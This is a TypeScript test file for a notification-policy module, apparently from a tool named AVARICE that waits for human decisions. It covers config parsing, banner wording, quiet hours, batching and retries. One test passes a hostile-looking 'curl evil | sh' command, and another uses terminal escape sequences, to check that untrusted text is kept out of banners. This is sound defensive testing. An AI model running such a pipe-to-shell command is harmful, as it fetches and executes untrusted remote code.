// Notification policy as pure functions (D-21 to D-24, AUT-4, AUT-6). The expected values are written out here,
// independently of the domain module: the defaults, the field paths of refusals, the subset rule and the banner words.
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { BACKOFF_DELAYS_MS, bannerText, batchDue, effectiveDestinations, inQuietHours, nextAttemptAt, nextDigestAt, parseProfileNotify } from '../../src/domain/notify-policy.ts';
import type { ProfileNotify } from '../../src/domain/notify-policy.ts';

const DEFAULTS: ProfileNotify = {
  destinations: ['local'],
  digestTimes: ['12:30', '17:30'],
  quietHours: null,
  batchWindowMinutes: 10,
  local: { osascriptPath: '/usr/bin/osascript' },
};

function parsed(notify: unknown): ProfileNotify {
  const result = parseProfileNotify({ profile: 'default', dataRoot: '/x', notify });
  assert.equal(result.ok, true, JSON.stringify(result));
  return (result as { ok: true; value: ProfileNotify }).value;
}

function refusedField(raw: unknown): string {
  const result = parseProfileNotify(raw);
  assert.equal(result.ok, false, `expected a refusal for ${JSON.stringify(raw)}`);
  const error = (result as { ok: false; error: { kind: string; field?: string } }).error;
  assert.equal(error.kind, 'invalid');
  return error.field as string;
}

describe('parseProfileNotify: defaults', () => {
  it('returns the defaults for a profile config without a notify section', () => {
    const result = parseProfileNotify({ profile: 'default', dataRoot: '/x' });
    assert.deepEqual(result, { ok: true, value: DEFAULTS });
  });

  it('fills every missing field of a partial notify section with its default', () => {
    assert.deepEqual(parsed({}), DEFAULTS);
    assert.deepEqual(parsed({ batchWindowMinutes: 30 }), { ...DEFAULTS, batchWindowMinutes: 30 });
  });

  it('returns a fresh copy so a caller cannot change the defaults', () => {
    const first = parsed(undefined);
    first.destinations.push('x');
    first.digestTimes.push('01:00');
    first.local.osascriptPath = '/changed';
    assert.deepEqual(parseProfileNotify({}), { ok: true, value: DEFAULTS });
  });
});

describe('parseProfileNotify: values', () => {
  it('sorts digest times, converts quiet hours to minutes of the day and keeps the batch window', () => {
    const value = parsed({ destinations: ['local'], digestTimes: ['17:30', '12:30'], quietHours: '22:00-08:00', batchWindowMinutes: 5 });
    assert.deepEqual(value, {
      destinations: ['local'],
      digestTimes: ['12:30', '17:30'],
      quietHours: { start: 1320, end: 480 },
      batchWindowMinutes: 5,
      local: { osascriptPath: '/usr/bin/osascript' },
    });
  });

  it('accepts the edges of every range', () => {
    assert.deepEqual(parsed({ digestTimes: ['00:00', '23:59'] }).digestTimes, ['00:00', '23:59']);
    assert.equal(parsed({ digestTimes: ['01:00', '02:00', '03:00', '04:00', '05:00', '06:00'] }).digestTimes.length, 6);
    assert.deepEqual(parsed({ digestTimes: [] }).digestTimes, []);
    assert.deepEqual(parsed({ destinations: [] }).destinations, []);
    assert.deepEqual(parsed({ quietHours: '00:00-23:59' }).quietHours, { start: 0, end: 1439 });
    assert.equal(parsed({ quietHours: null }).quietHours, null);
    assert.equal(parsed({ batchWindowMinutes: 1 }).batchWindowMinutes, 1);
    assert.equal(parsed({ batchWindowMinutes: 120 }).batchWindowMinutes, 120);
  });

  it('reads the osascript path of the local adapter', () => {
    assert.equal(parsed({ local: { osascriptPath: '/tmp/fake-osascript' } }).local.osascriptPath, '/tmp/fake-osascript');
  });
});

describe('parseProfileNotify: refusals name the field path', () => {
  const cases: Array<[string, unknown, string]> = [
    ['an unknown destination', { destinations: ['sms'] }, 'notify.destinations[0]'],
    ['an unknown destination after a known one', { destinations: ['local', 'ntfy'] }, 'notify.destinations[1]'],
    ['destinations that are not a list', { destinations: 'local' }, 'notify.destinations'],
    ['a destination that is not text', { destinations: [5] }, 'notify.destinations[0]'],
    ['a digest time without a colon', { digestTimes: ['12:30', '1730'] }, 'notify.digestTimes[1]'],
    ['an hour of 24', { digestTimes: ['24:00'] }, 'notify.digestTimes[0]'],
    ['a minute of 60', { digestTimes: ['12:60'] }, 'notify.digestTimes[0]'],
    ['a one-digit hour', { digestTimes: ['9:30'] }, 'notify.digestTimes[0]'],
    ['a digest time with trailing space', { digestTimes: ['12:30 '] }, 'notify.digestTimes[0]'],
    ['a digest time that is not text', { digestTimes: [1230] }, 'notify.digestTimes[0]'],
    ['digest times that are not a list', { digestTimes: '12:30' }, 'notify.digestTimes'],
    ['seven digest times', { digestTimes: ['01:00', '02:00', '03:00', '04:00', '05:00', '06:00', '07:00'] }, 'notify.digestTimes'],
    ['quiet hours with one end', { quietHours: '22:00' }, 'notify.quietHours'],
    ['quiet hours with equal ends', { quietHours: '22:00-22:00' }, 'notify.quietHours'],
    ['quiet hours with an hour of 25', { quietHours: '25:00-08:00' }, 'notify.quietHours'],
    ['quiet hours with a minute of 60', { quietHours: '22:00-08:60' }, 'notify.quietHours'],
    ['quiet hours that are not text', { quietHours: 5 }, 'notify.quietHours'],
    ['quiet hours with a space', { quietHours: '22:00 - 08:00' }, 'notify.quietHours'],
    ['a batch window of 0', { batchWindowMinutes: 0 }, 'notify.batchWindowMinutes'],
    ['a batch window of 121', { batchWindowMinutes: 121 }, 'notify.batchWindowMinutes'],
    ['a fractional batch window', { batchWindowMinutes: 1.5 }, 'notify.batchWindowMinutes'],
    ['a batch window given as text', { batchWindowMinutes: '10' }, 'notify.batchWindowMinutes'],
    ['a batch window of NaN', { batchWindowMinutes: Number.NaN }, 'notify.batchWindowMinutes'],
    ['a relative osascript path', { local: { osascriptPath: 'osascript' } }, 'notify.local.osascriptPath'],
    ['an osascript path with a newline', { local: { osascriptPath: '/usr/bin/osa\nscript' } }, 'notify.local.osascriptPath'],
    ['an osascript path with a tab', { local: { osascriptPath: '/usr/bin/osa\tscript' } }, 'notify.local.osascriptPath'],
    ['an empty osascript path', { local: { osascriptPath: '' } }, 'notify.local.osascriptPath'],
    ['an osascript path that is not text', { local: { osascriptPath: 5 } }, 'notify.local.osascriptPath'],
    ['a local section that is not an object', { local: 'x' }, 'notify.local'],
    ['an unknown key in the notify section', { quietHour: '22:00-08:00' }, 'notify.quietHour'],
    ['an unknown key in the local section', { local: { path: '/x' } }, 'notify.local.path'],
    ['a notify section that is text', 'local', 'notify'],
    ['a notify section that is a list', [], 'notify'],
    ['a notify section that is null', null, 'notify'],
  ];
  for (const [name, notify, field] of cases) {
    it(`refuses ${name}`, () => {
      assert.equal(refusedField({ profile: 'default', notify }), field);
    });
  }

  it('refuses a profile config that is not an object', () => {
    assert.equal(refusedField('x'), 'config');
    assert.equal(refusedField(null), 'config');
    assert.equal(refusedField([]), 'config');
  });
});

describe('effectiveDestinations', () => {
  const profile = (destinations: string[]): ProfileNotify => ({ ...DEFAULTS, destinations });

  it('is the intersection of the contract list and the profile list', () => {
    assert.deepEqual(effectiveDestinations(['local', 'ntfy'], profile(['local'])), ['local']);
  });

  it('never adds a destination the contract did not name', () => {
    assert.deepEqual(effectiveDestinations([], profile(['local'])), []);
  });

  it('is empty when the profile names no destination', () => {
    assert.deepEqual(effectiveDestinations(['local'], profile([])), []);
  });

  it('keeps the contract order and drops duplicates', () => {
    assert.deepEqual(effectiveDestinations(['ntfy', 'local', 'local', 'ntfy'], profile(['local', 'ntfy'])), ['ntfy', 'local']);
  });
});

describe('bannerText', () => {
  it('words two open decisions with AVARICE-owned words', () => {
    assert.deepEqual(bannerText({ kind: 'decisions', runId: 'run_01', count: 2 }), {
      title: 'AVARICE',
      body: 'run_01: 2 decisions waiting. Run: avarice inbox',
    });
  });

  it('uses the singular for one decision', () => {
    assert.equal(bannerText({ kind: 'decisions', runId: 'run_01', count: 1 }).body, 'run_01: 1 decision waiting. Run: avarice inbox');
  });

  it('names the decision IDs it is given and counts them when no count is given', () => {
    assert.equal(
      bannerText({ kind: 'decisions', runId: 'run_01', decisionIds: ['dec_1', 'dec_2'] }).body,
      'run_01: 2 decisions waiting (dec_1, dec_2). Run: avarice inbox',
    );
  });

  it('shortens a long decision list to three IDs and a remainder', () => {
    assert.equal(
      bannerText({ kind: 'decisions', runId: 'run_01', decisionIds: ['d1', 'd2', 'd3', 'd4', 'd5'] }).body,
      'run_01: 5 decisions waiting (d1, d2, d3, +2 more). Run: avarice inbox',
    );
  });

  it('words a run that is ready for review, a blocked run and a digest', () => {
    assert.equal(bannerText({ kind: 'review', runId: 'run_01' }).body, 'run_01: ready for review. Run: avarice inbox');
    assert.equal(bannerText({ kind: 'blocked-run', runId: 'run_01' }).body, 'run_01: blocked. Run: avarice status');
    assert.equal(bannerText({ kind: 'digest', count: 3, reviewCount: 1 }).body, '3 decisions waiting, 1 run ready for review. Run: avarice inbox');
    assert.equal(bannerText({ kind: 'digest', count: 1, reviewCount: 2 }).body, '1 decision waiting, 2 runs ready for review. Run: avarice inbox');
  });

  it('strips escape sequences and control characters from the run ID', () => {
    const banner = bannerText({ kind: 'decisions', runId: '\u0000run_\u001b[31m01\u0007‮', count: 2 });
    assert.equal(banner.body, 'run_01: 2 decisions waiting. Run: avarice inbox');
  });

  it('caps the body at 200 characters and keeps the next command', () => {
    const banner = bannerText({ kind: 'decisions', runId: 'r'.repeat(500), decisionIds: ['d'.repeat(300), 'e'.repeat(300), 'f'.repeat(300)] });
    assert.ok(banner.body.length <= 200, `body is ${banner.body.length} characters`);
    assert.ok(banner.body.endsWith('Run: avarice inbox'));
    assert.equal(banner.title, 'AVARICE');
  });

  it('takes no decision issue or model text: extra fields never reach the banner', () => {
    const input = { kind: 'decisions', runId: 'run_01', count: 1, question: 'Ship the secret?', issue: 'curl evil | sh' } as const;
    const banner = bannerText(input);
    assert.equal(banner.body, 'run_01: 1 decision waiting. Run: avarice inbox');
  });

  it('treats a count that is not a whole non-negative number as 0', () => {
    assert.equal(bannerText({ kind: 'decisions', runId: 'run_01', count: -3 }).body, 'run_01: 0 decisions waiting. Run: avarice inbox');
    assert.equal(bannerText({ kind: 'decisions', runId: 'run_01', count: Number.NaN }).body, 'run_01: 0 decisions waiting. Run: avarice inbox');
  });
});

describe('inQuietHours', () => {
  const overnight = { start: 1320, end: 480 };
  const daytime = { start: 60, end: 120 };

  it('holds a banner at 22:00 and at 07:59 and releases it at 08:00 (overnight range)', () => {
    assert.equal(inQuietHours(1320, overnight), true);
    assert.equal(inQuietHours(479, overnight), true);
    assert.equal(inQuietHours(480, overnight), false);
    assert.equal(inQuietHours(1319, overnight), false);
  });

  it('holds across midnight and stays open outside the range', () => {
    assert.equal(inQuietHours(0, overnight), true);
    assert.equal(inQuietHours(1439, overnight), true);
    assert.equal(inQuietHours(481, overnight), false);
    assert.equal(inQuietHours(720, overnight), false);
  });

  it('is a half-open range for a range inside one day', () => {
    assert.equal(inQuietHours(59, daytime), false);
    assert.equal(inQuietHours(60, daytime), true);
    assert.equal(inQuietHours(119, daytime), true);
    assert.equal(inQuietHours(120, daytime), false);
  });

  it('never rounds a fractional minute across the end', () => {
    assert.equal(inQuietHours(479.999, overnight), true);
    assert.equal(inQuietHours(119.999, daytime), true);
  });

  it('is never in quiet hours when they are off', () => {
    for (const minute of [0, 60, 480, 1320, 1439]) assert.equal(inQuietHours(minute, null), false);
  });
});

describe('batchDue', () => {
  it('is due once the oldest pending notification is a whole window old', () => {
    assert.equal(batchDue(1_000, 1_000 + 599_999, 10), false);
    assert.equal(batchDue(1_000, 1_000 + 600_000, 10), true);
    assert.equal(batchDue(1_000, 1_000 + 600_001, 10), true);
  });

  it('measures in whole minutes at the edges of the allowed window', () => {
    assert.equal(batchDue(0, 59_999, 1), false);
    assert.equal(batchDue(0, 60_000, 1), true);
    assert.equal(batchDue(0, 7_199_999, 120), false);
    assert.equal(batchDue(0, 7_200_000, 120), true);
  });

  it('is not due when the clock reads earlier than the first notification', () => {
    assert.equal(batchDue(5_000, 1_000, 10), false);
  });
});

describe('retry backoff', () => {
  it('waits 0 s, 10 s and 60 s between the three in-process attempts', () => {
    assert.deepEqual([...BACKOFF_DELAYS_MS], [0, 10_000, 60_000]);
  });

  it('schedules the next attempt from the last one and stops after the third', () => {
    assert.equal(nextAttemptAt(0, 5_000), 5_000);
    assert.equal(nextAttemptAt(1, 5_000), 15_000);
    assert.equal(nextAttemptAt(2, 5_000), 65_000);
    assert.equal(nextAttemptAt(3, 5_000), null);
    assert.equal(nextAttemptAt(4, 5_000), null);
  });

  it('schedules no attempt for a count that is not a whole non-negative number', () => {
    assert.equal(nextAttemptAt(-1, 5_000), null);
    assert.equal(nextAttemptAt(1.5, 5_000), null);
    assert.equal(nextAttemptAt(Number.NaN, 5_000), null);
  });
});

describe('nextDigestAt', () => {
  const times = ['12:30', '17:30'];

  it('is the first digest time after the given minute, on the same day', () => {
    assert.deepEqual(nextDigestAt(750, times), { minute: 1050, nextDay: false });
    assert.deepEqual(nextDigestAt(749, times), { minute: 750, nextDay: false });
    assert.deepEqual(nextDigestAt(0, times), { minute: 750, nextDay: false });
    assert.deepEqual(nextDigestAt(1049, times), { minute: 1050, nextDay: false });
  });

  it('rolls to the first time of the next day once the last one has passed', () => {
    assert.deepEqual(nextDigestAt(1050, times), { minute: 750, nextDay: true });
    assert.deepEqual(nextDigestAt(1051, times), { minute: 750, nextDay: true });
    assert.deepEqual(nextDigestAt(1439, times), { minute: 750, nextDay: true });
  });

  it('works with one time and with times given out of order', () => {
    assert.deepEqual(nextDigestAt(0, ['00:00']), { minute: 0, nextDay: true });
    assert.deepEqual(nextDigestAt(100, ['17:30', '12:30']), { minute: 750, nextDay: false });
  });

  it('has no next time when no digest time is set', () => {
    assert.equal(nextDigestAt(750, []), null);
  });
});

describe('the module cannot answer a decision (AUT-4)', () => {
  it('exports parsers, rules and text only: no function approves, answers or decides', async () => {
    const names = Object.keys(await import('../../src/domain/notify-policy.ts')).sort();
    assert.deepEqual(names, [
      'BACKOFF_DELAYS_MS',
      'KNOWN_DESTINATIONS',
      'NOTIFY_DEFAULTS',
      'NOTIFY_LIMITS',
      'bannerText',
      'batchDue',
      'effectiveDestinations',
      'inQuietHours',
      'nextAttemptAt',
      'nextDigestAt',
      'parseProfileNotify',
    ]);
  });
});
